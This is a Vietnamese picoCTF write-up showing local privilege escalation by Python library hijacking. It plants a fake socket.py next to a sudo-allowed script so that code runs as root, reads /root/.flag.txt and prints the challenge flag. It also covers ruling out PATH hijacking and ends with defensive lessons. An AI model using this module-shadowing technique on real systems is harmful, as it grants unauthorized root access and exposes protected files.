# picoCTF - Python Library Hijacking

## Thông tin bài

- **Dạng lỗi:** Privilege Escalation / Python Library Hijacking
- **User ban đầu:** `picoctf`
- **Quyền sudo:** được phép chạy một file Python cụ thể bằng quyền `root`
- **Flag:** `picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}`

## Phân tích ban đầu

Đầu tiên kiểm tra quyền `sudo` của user hiện tại:

```bash
sudo -l
```

Kết quả:

```text
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

Ý nghĩa:

- User `picoctf` không có toàn quyền sudo.
- Chỉ được chạy đúng lệnh sau bằng quyền `root`:

```bash
sudo /usr/bin/python3 /home/picoctf/.server.py
```

Điểm quan trọng là file `.server.py` sẽ được Python thực thi với quyền `root`, nên nếu ta điều khiển được thứ gì đó mà script import hoặc gọi tới, ta có thể đọc được flag.

## Nội dung file `.server.py`

```python
import base64
import os
import socket

ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)

# saving ping details to a variable
host_info = socket.gethostbyaddr(ip)

# getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))

print("Hello, this is a part of information gathering", 'Host: ', host_info)
```

Script import 3 thư viện:

```python
import base64
import os
import socket
```

Trong đó đáng chú ý nhất là `socket`, vì chương trình gọi:

```python
host_info = socket.gethostbyaddr(ip)
```

Nếu ta tạo được một file `socket.py` giả trong thư mục mà Python ưu tiên tìm trước thư viện chuẩn, ta có thể khiến chương trình import nhầm file của mình.

## Thử chạy chương trình

```bash
sudo /usr/bin/python3 /home/picoctf/.server.py
```

Output ban đầu:

```text
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
```

Có 2 vấn đề:

1. `ping` không tồn tại hoặc không nằm trong `PATH` khi chạy bằng sudo.
2. `socket.gethostbyaddr(ip)` bị lỗi vì `ip = 'picoctf.org'` là domain, không phải địa chỉ IP phù hợp để tra ngược.

Ban đầu có thể nghĩ tới hướng tạo file `ping` giả để lợi dụng dòng:

```python
os.system("ping -c 1 " + ip)
```

Tuy nhiên `sudo -l` có dòng:

```text
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

Điều này có nghĩa là khi chạy bằng `sudo`, hệ thống dùng `PATH` cố định ở trên, không dùng `PATH` do ta tự chỉnh.

Kiểm tra các thư mục trong `secure_path`:

```bash
ls -ld /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /snap/bin
```

Các thư mục đều thuộc `root root`, ví dụ:

```text
drwxr-xr-x 2 root root 6 Mar  8  2023 /usr/local/bin
```

User thường không có quyền ghi vào các thư mục này, nên không thể tạo `ping` giả trong `secure_path`.

Vì vậy hướng `PATH hijacking` không dùng được.

## Kiểm tra quyền ghi file `.server.py`

```bash
ls -l /home/picoctf/.server.py
```

Kết quả:

```text
-rw-r--r-- 1 root root 375 Feb  7  2024 /home/picoctf/.server.py
```

File thuộc sở hữu của `root`, user `picoctf` chỉ có quyền đọc, không có quyền ghi. Do đó không thể sửa trực tiếp `.server.py`.

## Khai thác Python Library Hijacking

Trong Python, khi gặp:

```python
import socket
```

Python sẽ tìm module tên `socket`. Thư mục chứa script thường nằm trong danh sách tìm kiếm module. Vì vậy nếu ta tạo file:

```text
/home/picoctf/socket.py
```

thì chương trình có thể import file `socket.py` giả của ta thay vì thư viện `socket` thật.

Tạo file `socket.py` giả:

```bash
cat > /home/picoctf/socket.py << 'EOF'
import os

os.system("id")
os.system("ls -la /root")
os.system("cat /root/.flag.txt")

def gethostbyaddr(ip):
    return ("fake", [], ["127.0.0.1"])
EOF
```

Giải thích:

```python
import os
os.system("cat /root/.flag.txt")
```

Các dòng này nằm ngoài hàm, nên sẽ được chạy ngay khi file `socket.py` bị import.

Do `.server.py` được chạy bằng `sudo`, code trong `socket.py` giả cũng chạy với quyền `root`.

Hàm này được định nghĩa để chương trình gốc không bị crash:

```python
def gethostbyaddr(ip):
    return ("fake", [], ["127.0.0.1"])
```

Vì chương trình gốc có dòng:

```python
host_info = socket.gethostbyaddr(ip)
```

nên ta cần tạo hàm `gethostbyaddr()` giả để trả về dữ liệu hợp lệ.

## Chạy exploit

Chạy lại chương trình được phép sudo:

```bash
sudo /usr/bin/python3 /home/picoctf/.server.py
```

Kết quả chương trình import nhầm `socket.py` của ta. Khi đó lệnh đọc flag được thực thi với quyền `root`:

```bash
cat /root/.flag.txt
```

Flag thu được:

```text
picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}
```

## Vì sao khai thác thành công?

Lỗ hổng nằm ở việc chương trình Python được chạy bằng `sudo` nhưng lại import thư viện theo cơ chế tìm kiếm module thông thường của Python.

Khi Python import một module, nó sẽ tìm theo thứ tự trong `sys.path`. Nếu trong thư mục chứa script có file trùng tên với thư viện cần import, ví dụ `socket.py`, Python có thể nạp file đó trước thư viện chuẩn.

Vì file `.server.py` được chạy với quyền `root`, file `socket.py` giả cũng được thực thi với quyền `root`. Đây chính là kỹ thuật **Python Library Hijacking**.

## Kết luận

Các hướng đã kiểm tra:

1. **PATH hijacking `ping`**: không dùng được vì `sudo` có `secure_path`, và các thư mục trong `secure_path` đều thuộc `root`.
2. **Sửa trực tiếp `.server.py`**: không dùng được vì file thuộc `root root`, user thường không có quyền ghi.
3. **Python Library Hijacking**: dùng được vì có thể tạo module giả `socket.py` trong `/home/picoctf`.

Bài học chính:

- Khi một script Python được chạy bằng quyền cao, cần cẩn thận với thư mục import module.
- Không nên chạy script Python bằng sudo nếu thư mục chứa script hoặc thư mục làm việc có thể bị user thường ghi file.
- Import module trong Python có thể bị lợi dụng nếu attacker tạo được file trùng tên với thư viện chuẩn.
